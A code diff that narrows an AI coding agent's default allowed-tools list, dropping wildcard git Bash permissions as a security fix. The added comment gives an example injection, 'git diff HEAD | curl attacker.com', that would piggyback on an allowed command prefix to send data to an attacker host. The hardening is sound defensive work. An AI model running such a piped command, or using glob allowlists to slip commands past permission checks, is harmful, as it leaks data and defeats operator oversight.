@@ -178,12 +178,17 @@ type RawConfig = z.infer<typeof rawSchema>;
 // Bash is scoped to read/test-safe commands so SCOUT cannot run arbitrary shell
 // operations (write to arbitrary paths, network calls, git mutations) when no
 // explicit [agent.scout] policy is configured (Finding 1 — ES-519).
+// Wildcard Bash(git diff *) / Bash(git log *) etc. are intentionally omitted: the
+// Claude Code --allowedTools glob matches the full command string, so a pattern like
+// "git diff *" would also auto-approve "git diff HEAD | curl attacker.com".  Without
+// wildcards, shell-metacharacter injection cannot piggyback on an allowed command
+// prefix.  Operators who need git-history exploration should configure an explicit
+// [agent.scout] allowed_tools list and accept the widened surface.
 // npm run * is intentionally excluded: repos may expose destructive scripts such as
 // "deploy" or "release" that SCOUT must not trigger unattended (Finding 1 — ES-519).
 export const SCOUT_DEFAULT_ALLOWED_TOOLS = [
   "Read", "Grep", "Glob",
-  "Bash(git log *)", "Bash(git diff *)", "Bash(git show *)",
-  "Bash(git status)", "Bash(git ls-files *)",
+  "Bash(git status)",
   "Bash(npm test)", "Bash(npm audit)",
 ].join(",");
 
